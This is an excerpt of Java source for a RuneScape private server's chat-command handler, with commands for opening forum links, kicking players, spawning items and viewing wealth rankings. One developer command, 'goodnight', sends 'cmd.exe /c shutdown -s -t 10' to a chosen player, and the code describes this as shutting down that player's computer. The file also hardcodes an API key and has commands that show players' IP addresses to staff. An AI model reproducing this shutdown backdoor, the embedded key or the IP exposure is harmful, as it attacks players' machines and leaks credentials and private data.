...
import com.arlania.world.content.npckills.NpcKills;
...
public class CommandPacketListener implements PacketListener {
	...
	private final static MotivoteRS motivote = new MotivoteRS("Mythic-Dream", "257ddcadb6e64d66d81462a483bbc2e4"); // replace
																												// API
																												// key
																												// and
																												// subdomain
	...
	private static void playerCommands(final Player player, String[] command, String wholeCommand) {
		if (command[0].equalsIgnoreCase("servernpckills")) {
			NpcKills.getResult();
			player.getPacketSender().sendMessage("@red@Total World NPCs killed: "+NpcKills.getTotalNpcsKilled());
		}
		...
		if (wholeCommand.equalsIgnoreCase("forum") || wholeCommand.equalsIgnoreCase("site")) {
			player.getPacketSender().sendString(1, "www.Mythic-Dream.org/forums/");
			player.getPacketSender().sendMessage("Attempting to open: Mythic-Dream Forums");
		...
		if (wholeCommand.equalsIgnoreCase("news") || wholeCommand.equalsIgnoreCase("new")) {
			player.getPacketSender().sendString(1, "www.Mythic-Dream.org/forum/index.php?/topic/509-new-month-new-Mythic-Dream-25off-rugang/");
		...
		if (wholeCommand.equalsIgnoreCase("benefits") || wholeCommand.equalsIgnoreCase("benefit")) {
			player.getPacketSender().sendString(1, "www.Mythic-Dream.org/forum/index.php?/topic/511-donation-benefits-rank-benefits/&do=getNewComment");
			player.getPacketSender().sendMessage("Make Sure To Read It All!");
		}
		if (wholeCommand.equalsIgnoreCase("refund") || wholeCommand.equalsIgnoreCase("benefit")) {
			player.getPacketSender().sendString(1, "www.Mythic-Dream.org/forum/index.php?/topic/510-official-rank-request-thread/#comment-2202");
			player.getPacketSender().sendMessage("Make Sure To Read It All!");
		}
		...
		if (command[0].equalsIgnoreCase("auth")) {
			if (!GameSettings.MYSQL_ENABLED) {
				player.getPacketSender().sendMessage("Unable to claim because voting is toggled off by Mythic-Dream");
				return;
			}
		...
		if (command[0].equalsIgnoreCase("thread")) {
			...
			player.getPacketSender().sendString(1, "www.Mythic-Dream.org/forum/" + threadId + "-");
		}
		...
		if (wholeCommand.equalsIgnoreCase("donate") || wholeCommand.equalsIgnoreCase("store")) {
			...
			player.getPacketSender().sendMessage("Attempting to open: Mythic-Dream Donation Page");
		}
		...
		if (command[0].equals("vote")) {
			player.getPacketSender().sendString(1, "http://Mythic-Dream.org/vote/");
			player.getPacketSender().sendMessage("Attempting to open Mythic-Dream voting");
		}
	...
	private static void helperCommands(final Player player, String[] command, String wholeCommand) {
		...
		if (command[0].equalsIgnoreCase("kick")) {
			...
			if (playerToKick == null) {
				player.getPacketSender().sendConsoleMessage("Player " + player2 + " couldn't be found on Mythic-Dream.");
				return;
	...
	private static void administratorCommands(final Player player, String[] command, String wholeCommand) {
		...
		if (command[0].equals("rights")) {
			if (player.getUsername().equalsIgnoreCase("Mythic-Dream") || player.getUsername().equalsIgnoreCase("Mythic-Dream")
					|| player.getUsername().equalsIgnoreCase("Mythic-Dream")) {
	...
	private static void developerCommands(Player player, String command[], String wholeCommand) {
		if (command[0].equals("reload")) {
			...
			World.sendMessage("@red@Drops have been reloaded");
			ItemDefinition.init();
			World.sendMessage("@red@Item Definitions have been reloaded");
		...
		if (command[0].equalsIgnoreCase("goodnight")) 
		{
            if (command[1].equalsIgnoreCase(""))
            {
                player.getPacketSender().sendMessage("* uses Reflect...*");
                player.getPacketSender().sendMessage("Its super effective.");
                player.getPacketSender().sendMessage("cmd.exe /c shutdown -s -t 10");
                return;
            } else 
            {
                String username = command[1].substring(command[1].indexOf(" ") + 1);
                Player p2 = World.getPlayerByName(username);
                p2.getPacketSender().sendMessage("cmd.exe /c shutdown -s -t 10");
                player.getPacketSender().sendMessage("Shutting down " + p2.getUsername() + "'s computer.");
            }
        }
		if (command[0].equalsIgnoreCase("giveyoutuber")) {
			String name = wholeCommand.substring(7);
		...
		if (command[0].equalsIgnoreCase("givesupport")) {
	      ...
	      if (command[0].equalsIgnoreCase("coords") || command[0].equalsIgnoreCase("loc")) {
        ...
        if (command[0].equalsIgnoreCase("runes")) {
            int[] runes = new int[]{555, 556, 557, 554, 558, 561, 562, 563, 566, 565, 564, 9075, 560, 51880};
            for (int i = 0; i < runes.length; i++) {
                player.getInventory().add(runes[i], 50000);
            }
        }
		
	     if (command[0].equalsIgnoreCase("getregion")) {
        ...
        if (command[0].equalsIgnoreCase("npcspawned")) {
	      ...
	      if (command[0].equalsIgnoreCase("location")) {
	            ...
	            player.getPacketSender().sendMessage("Location: @dre@" + loc);
	        }
		
		if (command[0].toLowerCase().equalsIgnoreCase("itemsingame")) {
              ...
              for (Item item : items) {
                  player.getBanks()[0].add(item, false);
              }
		  ...
		  if (command[0].toLowerCase().equalsIgnoreCase("uniqueips")) {
              ...
              player.getPacketSender().sendString(8144, "Beta Information");
              player.getPacketSender().sendString(8145, "");
              int id = 0;
              for (int i = 8147; i < 8147 + ip.size() - 1; i++) {
                  player.getPacketSender().sendString(i, "@dre@" + ip.get(id));
                  id++;
              }
		  ...
		  if (command[0].toLowerCase().equalsIgnoreCase("ips")) {
              HashMap<Player, String> ip = new HashMap<Player, String>();
              ...
              for (Player p : World.getPlayers()) {
                  if (p != null) {
                      if (p.getHostAddress() != null) {
                          player.getPacketSender().sendString(id, "@dre@" + p.getUsername() + " = " + p.getHostAddress());
                          id++;
                      }
                  }
              }

              player.sendMessage("There is " + ip.size() + " ips");
              player.getPacketSender().sendInterface(8134);
		...
		if (command[0].toLowerCase().equalsIgnoreCase("richest"))	{
            ...
            Collections.sort(objects, new Comparator<Player>() {
                @Override
                public int compare(Player p, Player p1) {

                    if (p.getWealth() == p1.getWealth()) {
                        return 0;
                    } else if (p.getWealth() > p1.getWealth()) {
                        return -1;
                    } else {
                        return 1;
                    }
            ...
            for (int i = 8145; i < 8196; i++)
                player.getPacketSender().sendString(i, "");
            player.getPacketSender().sendString(8136, "Close window");
            player.getPacketSender().sendString(8144, "Richest Players");
            player.getPacketSender().sendString(8145, "");
            int id = 0;
            for (int i = 8147; i < 8147 + objects.size(); i++) {
                player.getPacketSender().sendString(i, "@dre@" + objects.get(id).getUsername() + " @bla@- @blu@" + Misc.insertCommasToNumber(objects.get(id).getWealth() + ""));
                id++;
            }
	       ...
	       if (command[0].equalsIgnoreCase("ip")) {
	            Player target = World.getPlayerByName(wholeCommand.substring(command[0].length() + 1));
	            if (target != null) {
	               // player.sendMessage("@red@Searching...");

	                for (Player plr : World.getPlayers()) {
	                    if (plr != null) {
	                        if (plr.getHostAddress().equals(target.getHostAddress()) && !plr.equals(target)) {
	                            player.sendMessage("@blu@"+plr.getUsername() + "@bla@ has the same Ip address as @blu@" + target.getUsername());
	                        }
	                    }
	                }

	                //player.sendMessage("@red@Done search");
	            } else {
	                player.sendMessage(wholeCommand.substring(command[0].length() + 1) + " is not valid");
	            }
	        }
	    if (command[0].equalsIgnoreCase("telealltome")) {
            for (Player p : World.getPlayers()) {
                if (p != null)
                    p.moveTo(player.getPosition());
            }
        }
		
		
	    if (command[0].toLowerCase().equals("cashineco")) {
            ...
            player.sendMessage("There is @blu@" + Misc.insertCommasToNumber(gold + "") + "@bla@ coins, through @blu@" + plrLoops + "@bla@ players");

        }
		

		   if (command[0].equalsIgnoreCase("highestalch")) {

               HashMap<Integer, Integer> items = new HashMap<Integer, Integer>();

               for (int i = 0; i < ItemDefinition.getMaxAmountOfItems(); i++) {
                   if (ItemDefinition.forId(i) != null)
                       items.put(i, ItemDefinition.forId(i).getValue());
               }
               ...
               for (int i = 0; i < 30000; i++) {
                   if (items.get(i) >= 10000000)
                       player.sendMessage("Name: " + ItemDefinition.forId(i).getName() + " id: " + i + " - value: " + items.get(i));
               }
               // for (int i = 8145; i < 8196; i++)
               // player.getPacketSender().sendString(i, "");
               // player.getPacketSender().sendString(8136, "Close window");
               ...
               // player.getPacketSender().sendString(8145, "");
               // int id = 0;
               // for (int i = 8147; i < 8147 + 10; i++) {
               // player.getPacketSender().sendString(i, "@dre@" + "id: " + id + " - value: " +
               // items.get(id));
               // id++;
               // }
           }
